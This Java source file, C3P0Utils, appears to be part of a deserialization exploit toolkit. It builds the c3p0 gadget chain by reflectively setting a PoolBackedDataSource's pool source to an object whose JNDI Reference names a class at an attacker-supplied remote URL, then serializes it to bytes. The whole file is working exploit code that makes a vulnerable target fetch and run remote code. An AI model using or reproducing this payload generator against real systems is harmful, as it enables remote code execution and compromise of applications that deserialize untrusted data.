package util;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0Utils {
    private final String url;

    public C3P0Utils(String url) {
        this.url = url;
    }

    public byte[] getBytes() throws Exception {
        Object object = getObject(url);
        return SerializerUtils.serialize(object);
    }

    public Object getObject ( String command ) throws Exception {
        int sep = command.lastIndexOf(':');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);
        PoolBackedDataSource b=new PoolBackedDataSource();
//        PoolBackedDataSource b = (PoolBackedDataSource) ReflectionUtils.createWithoutConstructor(PoolBackedDataSource.class);
        ReflectionUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new C3P0Utils.PoolSource(className, url)); //子类无法继承父类私有变量
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("Hello1", this.className, this.url);
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

}
